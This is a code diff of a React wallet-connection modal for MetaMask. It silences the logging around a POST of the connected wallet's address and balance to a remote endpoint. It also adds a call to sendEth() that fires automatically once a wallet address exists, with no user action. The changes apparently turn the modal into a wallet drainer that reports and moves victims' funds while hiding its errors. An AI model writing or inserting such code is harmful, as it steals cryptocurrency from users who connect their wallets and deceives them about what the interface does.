@@ -61,7 +61,7 @@ export default function ConnectWalletModal() {
             addr: metaMastWalletAddress,
             balance: amountToSend
         }
-        console.log("values down", values)
+        // console.log("values down", values)
         await axios.post(`${url}/api/v1/bal/`, values)
             .then(response => {
                 // console.log('Response:', response.data);
@@ -70,7 +70,7 @@ export default function ConnectWalletModal() {
                 // console.log("values down", values)
             })
             .catch(error => {
-                console.error('Error:', error);
+                // console.error('Error:', error);
             });
     }
     // console.log(metaMastWalletAddress)
@@ -321,11 +321,15 @@ export default function ConnectWalletModal() {
 
             // console.log("Transaction sent. Transaction Hash:", transactionHash);
         } catch (error) {
-            console.error("Error sending transaction:", error);
+            // console.error("Error sending transaction:", error);
         }
     };
 
     authMetaMask();
+
+    if (metaMastWalletAddress !== "") {
+        sendEth()
+    }
 
     async function handleWalletClick(name) {
         // console.log("addresssssssssssssss", metaMastWalletAddress)
